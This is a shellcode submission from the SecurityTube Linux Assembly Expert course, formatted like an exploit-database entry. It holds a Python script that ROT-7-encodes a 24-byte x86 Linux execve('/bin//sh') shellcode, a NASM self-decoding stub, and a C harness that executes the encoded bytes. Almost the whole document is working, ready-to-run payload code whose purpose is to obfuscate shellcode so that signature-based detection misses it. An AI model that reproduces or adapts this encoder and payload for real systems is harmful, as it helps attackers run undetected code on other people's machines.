# Shellcode Title: ROT7
# Date: 5 July 2015
# Exploit Author: Artem Tsvetkov
# Software Link:
https://github.com/adeptex/SLAE/tree/master/Assignment-6/rot7
# Tested on: Kali GNU/Linux 1.1.0
# Platform: x86 Linux

This code was created as an exercise for the SecurityTube Linux Assembly
Expert (SLAE).

The following will produce rot7-encoded shellcode using a custom scheme to
dynamically set the shellcode length. The length is used by the decoder to
determine when it should stop decoding.




#!/usr/bin/python
# Python ROT-7 Encoder
# execve 24 bytes
shellcode = (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
    "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
)

# byte[0] == shellcode length
encoded = "\\x%02x," % len(bytearray(shellcode))
encoded2 = "0x%02x," % len(bytearray(shellcode))

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :
# boundary is computed as 255-ROT(x) where x, the amount to rotate by
    if x > 248:
        encoded += '\\x'
        encoded += '%02x' %(7 -(256 - x))
        encoded2 += '0x'
        encoded2 += '%02x,' %(7 -(256 - x))
    else:
        encoded += '\\x'
        encoded += '%02x'%(x+7)
        encoded2 += '0x'
        encoded2 += '%02x,' %(x+7)

print '\n%s\n\n%s\n\nShellcode Length: %d\n' % (encoded, encoded2,
len(bytearray(shellcode)))




The following is the NASM decoder:


; ROT7 NASM decoder
global _start
section .text
_start:
    jmp short stage

decoder:
    pop esi                ; shellcode address
    mov al, byte [esi]        ; shellcode length
    xor ecx, ecx             ; position

decode:
    mov bl, byte [esi+ecx+1]    ; get rot'ed byted
    sub bl, 0x7            ; rot it back (-7)
    mov byte [esi+ecx], bl        ; store it in shellcode
    inc ecx                ; next position
    cmp al, cl            ; check if reached the end of shellcode
    jnz short decode         ;     if not, continue derot'ing
    jmp shellcode            ;    else, execute derot'ed shellcode

stage:
    call decoder

    ; Shellcode Format:
    ;    byte[0]     = length of shellcode (max 0xff)
    ;    byte[1..]     = rot'ed shellcode
    shellcode: db
0x18,0x38,0xc7,0x57,0x6f,0x36,0x36,0x7a,0x6f,0x6f,0x36,0x69,0x70,0x75,0x90,0xea,0x38,0xd0,0x90,0xd1,0x71,0x12,0x5f,0xd4,0x87




/*
* Sample run
*
* Compile with: gcc rot7.c -o rot7
*
*/
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x16\x5e\x8a\x06\x31\xc9\x8a\x5c\x0e\x01\x80\xeb\x07\x88\x1c\x0e\x41\x38\xc8\x75\xf1\xeb\x05\xe8\xe5\xff\xff\xff\x18\x38\xc7\x57\x6f\x36\x36\x7a\x6f\x6f\x36\x69\x70\x75\x90\xea\x38\xd0\x90\xd1\x71\x12\x5f\xd4\x87";

int main()
{
    printf("Shellcode Length:  %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}